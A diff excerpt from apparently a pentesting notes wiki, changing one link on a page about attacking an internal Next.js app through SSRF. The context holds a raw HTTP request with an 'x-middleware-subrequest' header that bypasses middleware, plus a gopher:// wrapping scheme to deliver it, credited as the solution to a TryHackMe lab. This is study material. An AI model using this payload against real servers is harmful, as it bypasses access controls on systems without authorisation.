@@ -66,7 +66,7 @@ If the Next.js app is internal-only and you reach it via an SSRF that only takes
 req=b'GET /customapi HTTP/1.1\r\nHost: 127.0.0.1:10000\r\nx-middleware-subrequest: middleware\r\nConnection: close\r\n\r\n'
 # gopher://127.0.0.1:10000/_<percent-encoded req>  ->  ?url=<that, re-encoded>
 ```
-Full `gopher()` + `send(method,path,headers,...)` builder in [[ssrf]] payloads. This was the exact
+Full `gopher()` + `send(method,path,headers,...)` builder in [[wiki/techniques/web/ssrf]] payloads. This was the exact
 unlock on THM Extract (internal Next.js on :10000 behind an SSRF); run it via the hunt-ssrf skill.
 
 ## Internal cache poisoning chains (CVE-2024-46982)
